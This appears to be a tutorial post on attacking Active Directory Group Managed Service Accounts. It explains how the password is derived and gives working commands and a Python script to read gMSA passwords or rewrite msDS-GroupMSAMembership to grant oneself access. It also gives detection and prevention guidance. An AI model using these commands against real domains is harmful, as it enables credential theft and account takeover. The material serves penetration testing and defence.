---
title: gMSA - Group Managed Service Accounts
layout: post
date: 2026-08-04
description: "Group Managed Service Accounts hold a password no administrator ever sees, derived by the DC from a KDS root key. Who is allowed to read it is decided by a single writable attribute, which makes msDS-GroupMSAMembership one of the most valuable ACEs in a domain."
permalink: /theory/windows/AD/gmsa/
---

# Group Managed Service Accounts (gMSA)

## Overview

A Group Managed Service Account is an AD account whose password **nobody sets and nobody knows**. It exists to solve the service-account problem: a shared account running a service on several hosts normally ends up with a static password that is written in a runbook, never rotated, and eventually kerberoasted.

A gMSA replaces that with a password the Domain Controller derives on demand from a domain-wide secret, rotates automatically, and hands out only to hosts that are explicitly permitted to receive it. The password is 256 bytes of effectively random data, so it is not crackable, and no human ever types it.

The security of the whole design therefore rests on one question: **who is allowed to ask the DC for the password?** That is the answer stored in `msDS-GroupMSAMembership`, and it is a writable attribute like any other.

## How the password works

### The KDS root key

The Key Distribution Service holds one or more root keys in the configuration partition:

```
CN=Master Root Keys,CN=Group Key Distribution Service,CN=Services,CN=Configuration,DC=<domain>,DC=<tld>
```

Only Domain Controllers and Domain Admins can read them. From a root key, plus the gMSA's `msDS-ManagedPasswordId`, the DC deterministically derives that account's current password. Nothing is stored per-account: the password is recomputed every time it is asked for.

### `msDS-ManagedPassword` is constructed

`msDS-ManagedPassword` is a **constructed attribute**. It does not sit in NTDS; the DC computes it at query time, checks the caller against `msDS-GroupMSAMembership`, and only then returns it. Two consequences matter in practice:

- It is never returned by a wildcard LDAP query. You have to name the attribute explicitly.
- It is a confidential attribute, so the DC refuses to send it over a cleartext connection. The query needs **LDAPS (636)**, or LDAP with sign and seal. Tooling that silently falls back to plain LDAP will look like a permissions failure.

### Rotation

`msDS-ManagedPasswordInterval` sets the rotation period in days, default **30**. The returned blob carries both the current and the previous password so that a host which has not refreshed yet can still authenticate during the changeover.

Rotation does not help against an attacker who keeps the read right: they simply ask again after the change. It only bounds the lifetime of a password that was captured once.

## The attributes involved

| Attribute | Holds |
|---|---|
| `msDS-ManagedPassword` | The password blob, constructed at query time |
| `msDS-GroupMSAMembership` | Security descriptor: who may read the password |
| `msDS-ManagedPasswordId` | Key identifier used in the derivation |
| `msDS-ManagedPasswordInterval` | Rotation period in days (default 30) |
| `objectClass` | Includes `msDS-GroupManagedServiceAccount` |

PowerShell surfaces `msDS-GroupMSAMembership` under the friendlier name **`PrincipalsAllowedToRetrieveManagedPassword`**, which is the same security descriptor.

Finding them is a one-line filter:

```bash
nxc ldap '<DC>' -u '<user>' -p '<pass>' --gmsa
```

```bash
bloodyAD -u '<user>' -p '<pass>' -d '<DOMAIN>' --host '<DC>' \
    get search --filter '(objectClass=msDS-GroupManagedServiceAccount)' \
    --attr sAMAccountName,msDS-GroupMSAMembership
```

## The `MSDS-MANAGEDPASSWORD_BLOB`

What comes back is not a string, it is a structure:

```
Version                          (2 bytes)
Reserved                         (2 bytes)
Length                           (4 bytes)
CurrentPasswordOffset            (2 bytes)
PreviousPasswordOffset           (2 bytes)
QueryPasswordIntervalOffset      (2 bytes)
UnchangedPasswordIntervalOffset  (2 bytes)
CurrentPassword                  (variable)
PreviousPassword                 (variable, may be absent)
QueryPasswordInterval            (variable)
UnchangedPasswordInterval        (variable)
```

`CurrentPassword` is 256 bytes of UTF-16 data with a trailing null that must be stripped before use.

### Deriving the NT hash and Kerberos keys

The blob is not directly usable as a credential, so tools convert it. The **NT hash is MD4 over the raw password bytes**, exactly as for any account:

```python
currentPassword = blob['CurrentPassword'][:-2]      # strip the trailing UTF-16 null
nthash = MD4.new(currentPassword).hexdigest()
```

The AES keys need the Kerberos string-to-key function with the **computer-account salt**, which is the uppercase realm, the literal string `host`, the sAMAccountName without its trailing `$` in lowercase, a dot, and the lowercase domain:

```python
password = currentPassword.decode('utf-16-le').encode('utf-8')
salt = '%shost%s.%s' % (DOMAIN.upper(), sam[:-1].lower(), DOMAIN.lower())
aes128 = string_to_key(EncryptionTypes.aes128_cts_hmac_sha1_96.value, password, salt)
aes256 = string_to_key(EncryptionTypes.aes256_cts_hmac_sha1_96.value, password, salt)
```

For a gMSA named `svc_sql$` in `corp.local`, that salt is `CORP.LOCALhostsvc_sql.corp.local`.

> The password itself is useless to you as a string, but the derived NT hash and AES keys are ordinary credentials. Everything that takes `-H` or `-aesKey` works from here: SMB, WinRM, LDAP, `getTGT.py`, delegation abuse, and certificate enrollment as a machine account.
{: .prompt-info}

## Attack 1: you are already permitted (`ReadGMSAPassword`)

The simplest case. BloodHound draws this as a **`ReadGMSAPassword`** edge from a principal to the gMSA, meaning that principal is already in the descriptor. Nothing needs modifying, just read it.

```bash
# netexec: reads, parses and derives NT + AES in one step
nxc ldap '<DC-FQDN>' -u '<user>' -p '<pass>' --gmsa
```

```bash
# gMSADumper
python3 gMSADumper.py -u '<user>' -p '<pass>' -d '<DOMAIN>'
```

```bash
# bloodyAD, raw blob
bloodyAD -u '<user>' -p '<pass>' -d '<DOMAIN>' --host '<DC>' \
    get object 'svc_sql$' --attr msDS-ManagedPassword
```

Membership is frequently granted to a **group** rather than to individual hosts, which widens the attack surface considerably: any path that lands you in that group (`AddMember`, `GenericWrite` on the group, `WriteOwner`) is a path to the gMSA password.

## Attack 2: write on `msDS-GroupMSAMembership`

This is the interesting one, and it is total control over the account.

`msDS-GroupMSAMembership` is just a security descriptor stored in an attribute. If you hold `WriteProperty` on it (directly, or via `GenericWrite` / `GenericAll` / `WriteDacl` on the object), you can **replace the list of principals allowed to read the password with a list containing yourself**. There is no need to reset anything, join a group, or touch the password: you rewrite the answer to "who may ask".

### Building the security descriptor

Tooling generally writes this attribute as raw bytes, so the descriptor has to be assembled by hand. Impacket's `ldaptypes` has the structures:

```python
#!/usr/bin/env python3
import sys, base64
from impacket.ldap import ldaptypes

def make_sd(sid):
    sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
    sd['Revision'] = b'\x01'; sd['Sbz1'] = b'\x00'
    sd['Control']  = 0x8004                    # SE_DACL_PRESENT | SE_SELF_RELATIVE
    sd['OwnerSid'] = ldaptypes.LDAP_SID(); sd['OwnerSid'].fromCanonical('S-1-5-32-544')
    sd['GroupSid'] = b''; sd['Sacl'] = b''
    acl = ldaptypes.ACL(); acl['AclRevision'] = 2; acl['Sbz1'] = 0; acl['Sbz2'] = 0; acl.aces = []
    ace = ldaptypes.ACE()
    ace['AceType'] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE; ace['AceFlags'] = 0x00
    acedata = ldaptypes.ACCESS_ALLOWED_ACE()
    acedata['Mask'] = ldaptypes.ACCESS_MASK(); acedata['Mask']['Mask'] = 0xF01FF   # full control
    acedata['Sid'] = ldaptypes.LDAP_SID(); acedata['Sid'].fromCanonical(sid)
    ace['Ace'] = acedata; acl.aces.append(ace); sd['Dacl'] = acl
    return sd.getData()

print(base64.b64encode(make_sd(sys.argv[1])).decode())
```

Field by field:

- **`Control = 0x8004`** is `SE_SELF_RELATIVE | SE_DACL_PRESENT`. Self-relative means offsets rather than pointers, which is the only form that can be serialised into an attribute.
- **`OwnerSid = S-1-5-32-544`** sets the owner to `BUILTIN\Administrators`. Nothing requires this, it simply matches what a legitimately provisioned descriptor looks like.
- **`Mask = 0xF01FF`** is `GENERIC_ALL` expanded into its standard and specific rights. Only the read right is strictly required, but the DC evaluates the DACL for read access and full control includes it.
- **`Sacl = b''`** leaves out auditing, which is what the default looks like anyway.

Get the SID to grant straight from the directory:

```bash
bloodyAD -u '<user>' -p '<pass>' -d '<DOMAIN>' --host '<DC>' \
    get object '<grantee>' --attr objectSid
```

### Writing it and reading the password

```bash
bloodyAD -u '<user>' -p '<pass>' -d '<DOMAIN>' --host '<DC>' \
    set object 'svc_sql$' msDS-GroupMSAMembership -v '<base64-SD>' --raw --b64
```

Then read the password as the principal you just granted. `nxc --gmsa` conveniently prints `PrincipalsAllowedToReadPassword` alongside the hash, so the same command both confirms the write landed and returns the credential:

```bash
nxc ldap '<DC-FQDN>' -u '<grantee>' -p '<pass>' --gmsa
```

> **This write is destructive.** `msDS-GroupMSAMembership` is single-valued: overwriting it removes every principal that was legitimately allowed to retrieve the password, and any host running the service breaks at its next password refresh. On an engagement, read the existing descriptor first, append your ACE to the existing DACL, and write the merged value back. Keep the original base64 so it can be restored.
{: .prompt-warning}

## Attack 3: Golden gMSA

If you can read the **KDS root key** itself (Domain Admin, DC, or a backup of the configuration partition), you can compute the password of *every* gMSA in the domain, offline, for any point in time, without ever contacting a DC again.

Because the derivation is deterministic from the root key plus `msDS-ManagedPasswordId`, rotation does not help: you can compute future passwords as easily as current ones. This is a persistence technique rather than an escalation one, and it is only remediated by rolling the KDS root key, which is disruptive.

## Detection

- **Event ID 4662** on the gMSA object, looking for reads of the `msDS-ManagedPassword` property. Legitimate reads come from the hosts running the service and are predictable; anything else is worth an alert.
- **Event ID 5136** for modifications to `msDS-GroupMSAMembership`. In a stable environment this attribute changes when a service is deployed to a new host and at no other time, so the noise floor is very low.
- LDAP queries that name `msDS-ManagedPassword` explicitly from a workstation rather than from a service host.

```powershell
# Review who can read each gMSA password
Get-ADServiceAccount -Filter * -Properties PrincipalsAllowedToRetrieveManagedPassword |
    Select-Object Name, PrincipalsAllowedToRetrieveManagedPassword
```

## Prevention

1. **Grant the read right to computer accounts, not to user groups.** A gMSA is meant to be readable by the hosts running the service. A user group in `PrincipalsAllowedToRetrieveManagedPassword` converts every path into that group into a path to the credential.
2. **Audit who can write the attribute, not just who can read it.** `WriteProperty` on `msDS-GroupMSAMembership` is equivalent to being in the list, and standard "who can read this password" reports do not show it.
3. **Treat `WriteDacl` / `WriteOwner` / `GenericAll` on a gMSA object as full compromise of that account**, because each of them reaches the membership attribute.
4. **Protect the KDS root key** the same way you protect `krbtgt`. Anyone who reads it owns every gMSA in the domain permanently.
5. **Do not put gMSAs in privileged groups** without accounting for the fact that their credential is retrievable by design.

## References

- [Microsoft - Group Managed Service Accounts overview](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/group-managed-service-accounts/group-managed-service-accounts-overview)
- [MS-ADTS 2.2.19 - MSDS-MANAGEDPASSWORD_BLOB](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e)
- [The Hacker Recipes - Group Managed Service Accounts](https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword)
- [gMSADumper](https://github.com/micahvandeusen/gMSADumper)
- [Semperis - Golden gMSA](https://www.semperis.com/blog/golden-gmsa-attack/)
